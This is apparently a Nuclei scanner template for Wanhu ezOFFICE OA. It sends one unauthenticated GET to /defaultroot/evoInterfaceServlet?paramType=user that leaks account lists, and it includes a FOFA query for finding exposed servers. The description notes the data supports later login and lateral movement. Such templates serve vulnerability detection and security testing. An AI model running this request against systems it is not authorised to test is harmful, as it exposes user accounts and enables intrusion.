id: wanhu-evointerfaceservlet-unauth

info:
  name: 万户 ezOFFICE evoInterfaceServlet 未授权账户信息泄露
  author: zan8in
  severity: high
  description: |
    万户 OA /defaultroot/evoInterfaceServlet?paramType=user 未授权返回 userList 等账户数据，可用于后续登录与横向。
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="万户网络-ezOFFICE"
  tags: wanhu,ezoffice,unauth,disclosure

http:
  - method: GET
    path:
      - "{{BaseURL}}/defaultroot/evoInterfaceServlet?paramType=user"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "result:"
          - "data:"
          - '"userList":'
        condition: and
      - type: status
        status:
          - 200
